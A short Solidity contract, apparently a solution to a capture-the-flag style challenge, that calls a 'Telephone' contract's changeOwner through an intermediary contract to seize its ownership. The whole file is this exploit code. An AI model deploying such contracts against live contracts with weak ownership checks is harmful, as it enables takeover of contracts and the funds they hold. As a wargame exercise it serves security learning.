// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}


contract ClaimTelephone {

    ITelephone telephone;
    address owner;

    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
        owner = msg.sender;
    }

    function claimTelephone(address _newOwner) external {
        require(msg.sender == owner, "Not the owner of the contract");
        telephone.changeOwner(_newOwner);
    }

}